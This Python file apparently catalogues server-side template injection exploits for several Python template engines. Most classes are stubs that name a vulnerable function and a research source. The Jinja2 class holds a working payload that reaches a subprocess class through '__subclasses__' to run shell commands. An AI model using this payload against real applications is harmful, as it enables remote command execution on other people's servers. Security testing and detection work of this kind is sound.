from .execution_base import Exploit
import jinja2


class ServerSideTemplateInjectionExploit(Exploit):
    category_name = "Server-Side Template Injection Exploit"

class JinjaTemplateExploit(ServerSideTemplateInjectionExploit):
    vulnerable_function = jinja2.Template.render
    def generate_payload(command: str) -> str:
        # the index of the class can vary!
        return f"{{{{''.__class__.__mro__[1].__subclasses__()[426]('{command}',shell=True,stdout=-1).communicate()}}}}"

    def run_payload(payload: str) -> None:
        template = jinja2.Template(payload)
        return template.render()



class TornadoTemplateExploit(ServerSideTemplateInjectionExploit):
    vulnerable_function = "tornado.template.Template.__init__"
    notes = "This category hasn't been fully explored"
    source = "https://ajinabraham.com/blog/server-side-template-injection-in-tornado"

class MakoTemplateExploit(ServerSideTemplateInjectionExploit):
    vulnerable_function = "mako.template.Template.__init__"
    notes = "This category hasn't been fully explored"
    source = "https://portswigger.net/research/server-side-template-injection"

class ChameleonTemplateExploit(ServerSideTemplateInjectionExploit):
    vulnerable_function = "chameleon.PageTemplate.__init__"
    notes = "This category hasn't been fully explored"
    source = "https://github.com/github/codeql/blob/5c2bf68a05a895cd86d3cf32b70e045ce64782dc/python/ql/src/experimental/semmle/python/templates/Chameleon.qll"

class CheetahTemplateExploit(ServerSideTemplateInjectionExploit):
    vulnerable_function = "Cheetah.Template.Template"
    notes = "This category hasn't been fully explored"
    source = "https://github.com/github/codeql/blob/5c2bf68a05a895cd86d3cf32b70e045ce64782dc/python/ql/src/experimental/semmle/python/templates/Cheetah.qll"

class TRenderTemplateExploit(ServerSideTemplateInjectionExploit):
    vulnerable_function = "trender.TRender"
    notes = "This category hasn't been fully explored"
    source = "https://github.com/github/codeql/blob/5c2bf68a05a895cd86d3cf32b70e045ce64782dc/python/ql/src/experimental/semmle/python/templates/TRender.qll"

class GenshiTemplateExploit(ServerSideTemplateInjectionExploit):
    vulnerable_function = "genshi.template.TextTemplate"
    notes = "This category hasn't been fully explored"
    source = "https://github.com/github/codeql/blob/5c2bf68a05a895cd86d3cf32b70e045ce64782dc/python/ql/src/experimental/semmle/python/templates/Genshi.qll"

class AirspeedTemplateExploit(ServerSideTemplateInjectionExploit):
    vulnerable_function = "airspeed.Template"
    notes = "This category hasn't been fully explored"
    source = "https://github.com/github/codeql/blob/5c2bf68a05a895cd86d3cf32b70e045ce64782dc/python/ql/src/experimental/semmle/python/templates/Airspeed.qll"

class ChevronTemplateExploit(ServerSideTemplateInjectionExploit):
    vulnerable_function = "chevron.render"
    notes = "This category hasn't been fully explored"
    source = "https://github.com/github/codeql/blob/5c2bf68a05a895cd86d3cf32b70e045ce64782dc/python/ql/src/experimental/semmle/python/templates/Chevron.qll"
